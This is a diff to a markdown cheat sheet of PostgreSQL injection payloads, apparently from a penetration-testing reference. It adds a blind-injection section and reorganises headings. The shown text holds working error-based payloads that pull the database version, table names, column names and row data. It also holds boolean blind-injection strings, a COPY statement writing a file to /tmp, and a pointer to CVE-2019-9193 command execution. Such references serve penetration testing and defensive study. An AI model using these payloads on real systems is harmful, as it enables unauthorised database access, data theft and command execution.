@@ -1,4 +1,15 @@
-# POSTGRESQL
+# PostgreSQL injection
+
+## Summary
+
+* [PostgreSQL Comments](#postgresql-comments)
+* [PostgreSQL Error Based](#postgresql-error-based)
+* [PostgreSQL Blind](#postgresql-blind)
+* [PostgreSQL Time Based](#postgresql-time-based)
+* [PostgreSQL File Read](#postgresql-file-read)
+* [PostgreSQL File Write](#postgresql-file-write)
+* [PostgreSQL Command execution](#postgresql-command-execution)
+* [References](#references)
 
 ## PostgreSQL Comments
 
@@ -7,13 +18,20 @@
 /**/  
 ```
 
-## PostgreSQL Error Based - Basic
+## PostgreSQL Error Based
 
 ```sql
 ,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
 ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
 ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
 ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
+```
+
+## PostgreSQL Blind
+
+```sql
+' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
+' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
 ```
 
 ## PostgreSQL Time Based
@@ -47,7 +65,7 @@ SELECT * FROM pentestlab;
 COPY pentestlab(t) TO '/tmp/pentestlab';
 ```
 
-## PostgreSQL - Command execution
+## PostgreSQL Command execution
 
 CVE-2019–9193, can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. 
 
@@ -65,3 +83,4 @@ DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
 
 * [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
 * [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
+* [SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)](https://hackerone.com/reports/181803)
